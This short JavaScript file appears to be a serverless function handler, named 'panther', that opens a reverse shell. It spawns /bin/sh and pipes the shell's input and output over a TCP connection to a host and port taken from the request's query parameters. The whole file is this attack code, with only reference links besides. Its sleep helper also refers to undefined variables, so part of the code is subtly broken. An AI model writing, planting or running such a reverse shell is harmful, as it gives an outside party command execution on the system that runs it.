/* References
https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
https://stackoverflow.com/a/33292942
*/
'use strict';

const net = require('net');
const cp = require('child_process');

function timeout(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function sleep(ms) {
  await timeout(ms);
  return fn(...args);
}

module.exports.panther = async event => {
  let host;
  let port;

  if (event.queryStringParameters) {
    host = event.queryStringParameters.host;
    port = event.queryStringParameters.port;
  }

  if (!host || !port) {
    return {
      statusCode: 400,
      body: JSON.stringify({
        Error: 'Must provide the host and port for the target TCP server as query parameters.'
      })
    };
  }

  const portNum = parseInt(port, 10);

  const sh = cp.spawn('/bin/sh', []);
  const client = new net.Socket();

  client.connect(portNum, host, () => {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });

  await sleep(30000);

  return {
    statusCode: 500,
    body: JSON.stringify({
      Error: 'Function timeout.'
    })
  };
};
